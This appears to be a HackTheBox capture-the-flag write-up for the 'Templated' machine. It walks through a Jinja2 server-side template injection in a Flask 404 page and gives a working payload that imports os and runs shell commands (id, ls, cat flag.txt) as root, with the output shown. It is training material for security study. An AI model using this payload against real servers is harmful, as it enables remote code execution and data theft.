# Templated - HackTheBox
Hello! I am `skelet0n` and in this writeup we will exploit a **Server Side Template Injection** vulnerability on a **HackTheBox** machine, "**Templated**."

## Introduction to SSTI
A server-side template injection (**SSTI**) occurs when an attacker is able to use native **template syntax** to inject a malicious payload into a template, which is then executed **server-side**.

## 🏗️ Getting our hands dirty
Let's connect using `openvpn` to `HTB`'s network and then start recon on the machine.

```bash
$ sudo openvpn skelly.ovpn &
[1] x
[1] x suspended (tty output)  sudo openvpn skelly.ovpn
```

Now we should be able to access the website.

```bash
$ curl http://46.101.84.151:32488/
*   Trying 46.101.84.151:32488...
* Connected to 46.101.84.151 (46.101.84.151) port 32488 (#0)
> GET / HTTP/1.1
> Host: 46.101.84.151:32488
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 79
< Server: Werkzeug/1.0.1 Python/3.9.0
< Date: Tue, 07 Feb 2023 15:42:44 GMT
< 

<h1>Site still under construction</h1>
<p>Proudly powered by Flask/Jinja2</p>
* Closing connection 0
```
*yes I am a terminal guy*

We can see `Werkzeug` is used on the website. This opens a new attack vector for us. The debugger that `Werkzeug` provides to the developer is known to be vulnerable to key generation attacks. The debugger usually lies on the `/console` page.

```bash
$ curl http://46.101.84.151:32488/console 

<h1>Error 404</h1>
<p>The page '<str>console</str>' could not be found</p>%
```

Notice the website reflects the page we searched for.
Therefore here is our **SSTI**.
Now that we know we can inject malicious payloads, we can use *Method Resolution Order* to make the *request* library which is used in *Flask* to import *os*, a builtin library that allows us to communicate with the shell.

Here is what the payload looks like:

```python
request.application.__globals__.__builtins__.__import__('os').popen('<COMMAND>').read()
```

We access the *global variables* and from there we access the built-ins that also contain the *os* library. 
We now import it using the *\__import\__* dunder and call a system command.


```bash
$ curl "http://46.101.84.151:32488/\{\{request.application.__globals__.__builtins__.__import__('os').popen('id').read()\}\}"


<h1>Error 404</h1>
<p>The page '<str>uid=0(root) gid=0(root) groups=0(root)
</str>' could not be found</p>%
```
*We use MRO to execute the **id** command*

Hey, turns out we are root! Let's search for the flag.

```bash
$ curl "http://46.101.84.151:32488/\{\{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()\}\}" 


<h1>Error 404</h1>
<p>The page '<str>bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</str>' could not be found</p>%

$ curl "http://46.101.84.151:32488/\{\{request.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()\}\}"


<h1>Error 404</h1>
<p>The page '<str>HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
</str>' could not be found</p>%
```

And we get the flag : )

## Goodbye

I hope you enjoyed this writeup. Make sure to give this repository a star if you did and open an issue if you didn't or have any ideas/suggestions.

- `skeleton`